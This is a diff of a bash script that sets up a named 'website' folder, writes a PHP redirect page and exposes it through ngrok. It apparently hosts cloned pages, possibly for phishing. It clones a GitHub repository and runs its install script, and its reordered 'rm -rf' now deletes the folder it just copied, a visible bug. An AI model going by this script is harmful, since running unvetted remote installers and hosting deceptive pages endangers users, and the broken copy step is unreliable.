@@ -1,4 +1,4 @@
-wcho "Choose your device: "
+echo "Choose your device: "
 echo "1. Phone"
 echo "2. Computer"
 read -r device
@@ -14,13 +14,13 @@ read -r website
 if [ ! -e "$HOME/web" ]; then
 cd ~ && mkdir web
 else
-echo "Fine! web folder existed in kali's files.."
+echo "Fine! web folder existed in Home directory.."
 fi
 echo
 if [ ! -e "$loc/web" ]; then
 cd $loc/ && mkdir web
 else
-echo "Fine! web folder existed in D drive"
+echo "Fine! web folder existed in your Storage"
 fi
 if [ -e "$loc/web/$website" ]; then 
 echo "Fine! $website folder existed"
@@ -50,16 +50,16 @@ header ('Location: $ori');
 ?>
 EOF
 cd $loc/web/
-rm -rf ~/web/$website
 cp -r $loc/web/$website ~/web
+rm -rf ~/web/$website
 cd ~
 else
 echo "Add files in /web/$website and come back again"
 exit 1
 fi
 if [ ! -e "$HOME/ngrok" ]; then
-git clone https://github.com/NganDii/remngrok
-cd remngrok && bash ngrok.sh
+git clone https://github.com/NganDii/ngrok
+cd ngrok && bash Install.sh
 fi
 cd ~
 cp -R ngrok web/$website
